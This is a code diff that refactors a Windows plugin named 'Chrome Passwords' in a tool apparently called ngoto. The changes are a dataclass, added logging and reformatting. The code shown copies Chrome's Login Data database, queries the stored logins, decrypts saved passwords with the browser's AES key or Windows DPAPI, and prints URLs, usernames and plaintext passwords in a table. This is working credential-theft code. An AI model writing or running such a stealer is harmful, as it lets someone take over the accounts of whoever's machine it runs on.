@@ -1,10 +1,11 @@
-from ngoto.core.util.plugin import Plugin
+from ngoto.core.util.plugin import PluginBase
 from ngoto.core.util.logging import Logging
 from ngoto.core.util.interface import output
-from rich.table import Table # used in this plugin
-from rich.style import Style # used in this plugin
+from rich.table import Table, Style  # used in this plugin
+from dataclasses import dataclass
 
-class Plugin(Plugin):
+
+class Plugin(PluginBase):
     name = 'Chrome Passwords'
     version = 0.1
     description = 'Get stored chrome passwords'
@@ -14,16 +15,15 @@ class Plugin(Plugin):
     parameters: list = []
     os: list = ['Windows']
 
-    table: Table = None # used in this plugin 
-    title_style = Style(color="blue", blink=False, bold=True) # used in this plugin
-    border_style = Style(color="black", blink=False, bold=True) # used in this plugin
-    header_style = Style(color="black", blink=False, bold=True) # used in this plugin
-
-
+    table: Table = None
+    title_style = Style(color="blue", blink=False, bold=True)
+    border_style = Style(color="black", blink=False, bold=True)
+    header_style = Style(color="black", blink=False, bold=True)
 
     def get_chrome_datetime(self, chromedate):
         """Return a `datetime.datetime` object from a chrome format datetime
-        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+        Since `chromedate` is formatted as the number of microseconds since
+        January, 1601"""
         from datetime import datetime, timedelta
         return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
@@ -59,13 +59,18 @@ class Plugin(Plugin):
             cipher = AES.new(key, AES.MODE_GCM, iv)
             # decrypt password
             return cipher.decrypt(password)[:-16].decode()
-        except:
+        except Exception as e:
             try:
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-            except:
-                # not supported
+                self.logger.warning(
+                    f'Could not decrypt password, {e}',
+                    program='Chrome Passwords')
+                return str(win32crypt.CryptUnprotectData(
+                    password, None, None, None, 0)[1])
+            except Exception as e2:
+                self.logger.warning(
+                    f'Could not decrypt password, {e2}',
+                    program='Chrome Passwords')
                 return ""
-
 
     def get_context(self) -> list:
         import shutil
@@ -74,8 +79,9 @@ class Plugin(Plugin):
         # get the AES key
         key = self.get_encryption_key()
         # local sqlite Chrome database path
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                                "Google", "Chrome", "User Data", "default", "Login Data")
+        db_path = os.path.join(
+            os.environ["USERPROFILE"], "AppData", "Local",
+            "Google", "Chrome", "User Data", "default", "Login Data")
         # copy the file to another location
         # as the database will be locked if chrome is currently running
         filename = "ChromeData.db"
@@ -84,16 +90,20 @@ class Plugin(Plugin):
         db = sqlite3.connect(filename)
         cursor = db.cursor()
         # `logins` table has the data we need
-        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        
+        cursor.execute(
+            ' '.join(
+                ["select origin_url, action_url, username_value,",
+                    "password_value, date_created, date_last_used",
+                    "from logins order by date_created"]))
+
+        @dataclass
         class Password:
-            def __init__(self, origin_url, action_url, username_value, password_value, date_created, date_last_used):
-                self.origin_url = str(origin_url)
-                self.action_url = str(action_url)
-                self.username_value = str(username_value)
-                self.password_value = str(password_value)
-                self.date_created = str(date_created)
-                self.date_last_used = str(date_last_used)
+            origin_url: str
+            action_url: str
+            username_value: str
+            password_value: str
+            date_created: str
+            date_last_used: str
 
         passwords = []
         for row in cursor.fetchall():
@@ -102,41 +112,42 @@ class Plugin(Plugin):
             username = row[2]
             password = self.decrypt_password(row[3], key)
             date_created = row[4]
-            date_last_used = row[5]  
-            passwords.append(Password(origin_url, action_url, username, password, date_created, date_last_used))      
-            # if username or password:
-            #     print(f"Origin URL: {origin_url}")
-            #     print(f"Action URL: {action_url}")
-            #     print(f"Username: {username}")
-            #     print(f"Password: {password}")
-            # else:
-            #     continue
-            # if date_created != 86400000000 and date_created:
-            #     print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
-            # if date_last_used != 86400000000 and date_last_used:
-            #     print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
-            # print("="*50)
+            date_last_used = row[5]
+            passwords.append(
+                Password(
+                    str(origin_url),
+                    str(action_url),
+                    str(username),
+                    str(password),
+                    str(date_created),
+                    str(date_last_used)
+                    )
+                )
         cursor.close()
         db.close()
         try:
             # try to remove the copied db file
             os.remove(filename)
-        except:
-            pass
+        except Exception as e:
+            self.logger.warning(
+                f'Could not remove {filename}, {e}',
+                program='Chrome Passwords')
         return {"passwords": passwords}
-
 
     # main function to handle input, then calls and return get_context method
     def main(self, logger):
         self.logger = logger
-        logger.info(f'Getting Chrome Passwords', program='Chrome Passwords')
+        logger.info('Getting Chrome Passwords', program='Chrome Passwords')
         context = self.get_context()
-        logger.info(f'Successfully Got Passwords', program='Chrome Passwords')
+        logger.info('Successfully Got Passwords', program='Chrome Passwords')
         return context
 
     # given context of information prints information
     def print_info(self, context):
-        self.table = Table(title="Ngoto Chrome Passwords Plugin", title_style=self.title_style, border_style = self.border_style)   
+        self.table = Table(
+            title="Ngoto Chrome Passwords Plugin",
+            title_style=self.title_style,
+            border_style=self.border_style)
         self.table.add_column("Origin URL", style=self.header_style)
         self.table.add_column("Action URL", style=self.header_style)
         self.table.add_column("Username", style=self.header_style)
@@ -144,7 +155,13 @@ class Plugin(Plugin):
         self.table.add_column("Creation Date", style=self.header_style)
         self.table.add_column("Last Used", style=self.header_style)
         for password in context["passwords"]:
-            self.table.add_row(password.origin_url, password.action_url, password.username_value, password.password_value, password.date_created, password.date_last_used)
+            self.table.add_row(
+                password.origin_url,
+                password.action_url,
+                password.username_value,
+                password.password_value,
+                password.date_created,
+                password.date_last_used)
         output(self.table)
 
     # holds sqlite3 create table query to store information
